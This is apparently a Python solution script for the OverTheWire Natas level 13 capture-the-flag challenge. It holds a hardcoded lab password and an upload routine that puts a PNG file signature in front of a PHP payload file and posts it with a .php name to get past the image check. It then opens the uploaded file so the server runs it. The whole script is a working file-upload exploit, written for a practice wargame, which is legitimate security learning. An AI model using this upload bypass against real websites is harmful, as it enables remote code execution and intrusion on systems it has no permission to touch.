#!/usr/local/bin/python3

import requests
import re
import subprocess
import webbrowser


# We need to exploit the upload function. We can add anything that'll run in
# apache user permissions dont let us look outside of the dir

NATAS = "natas13"
PASS = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'
URL = "http://" + NATAS + ".natas.labs.overthewire.org"


payload = {'filename': 'jack_russell.php'}

# Create a malicious png file called jack_russell.
with open('jack_russell.php', 'wb') as file:
    pngSignature = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'
    file.write(pngSignature)
    file.write(open('payload.php', 'rb').read())

files = {'uploadedfile': open('jack_russell.php', 'rb')}

r = requests.post(URL, auth=(NATAS, PASS), files=files, data=payload)
getUrl = re.findall('<\s*a[^>]*>(.*?)<\s*/\s*a>', str(r.text))
firefox = webbrowser.get('firefox')

firefox.open_new_tab('{0}{1}{2}'.format(URL, '/', getUrl[0]))
# subprocess.call(['firefox', URL, '/', getUrl[0]])
print(getUrl[0])

# print(r.history)
# print(r.status_code)
# print(r.headers)
